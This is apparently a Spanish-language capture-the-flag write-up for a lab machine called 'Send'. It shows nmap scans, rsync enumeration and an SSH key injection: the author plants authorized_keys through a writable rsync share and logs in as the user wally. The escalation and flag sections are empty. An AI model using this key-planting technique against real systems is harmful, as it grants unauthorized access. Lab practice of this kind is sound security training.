# Máquina Send

### Reconocimiento de la Ip de la máquina víctima

![alt text](image.png)

### Puertos abiertos

sudo nmap -sS --disable-arp-ping --min-rate 6000 -p- --open -vvv -Pn 192.168.5.139

![alt text](image-1.png)

### Servicios y versiones 

sudo nmap -sVC --min-rate 6000 -p22,80,873 -vvv -Pn 192.168.5.139

![alt text](image-2.png)


### Fuzing web

No se encontró nada interesante

### Explotación

me conecté con rsync haciendo:

rsync -av 192.168.5.139::

![alt text](image-3.png)

significa que tenemos un usuario wally el cúal tiene un directorio share

luego hice la técnica de inyección de claves ssh ya que tenemos ssh corriendo:

ssh-keygen -t rsa -b 4096

creamos una carpeta .ssh y ahí subimos el archivo id_rsa.pb y luego hacemos cp id_rsa.pub authorized_keys y subimos con rsync

rsync -av .ssh 192.168.5.139::share/

le damos chmod 600 id_rsa

me conecto por ssh

ssh -i id_rsa wally@192.168.5.139

![alt text](image-4.png)


### Escalar privilegios






### user.txt


### root.txt

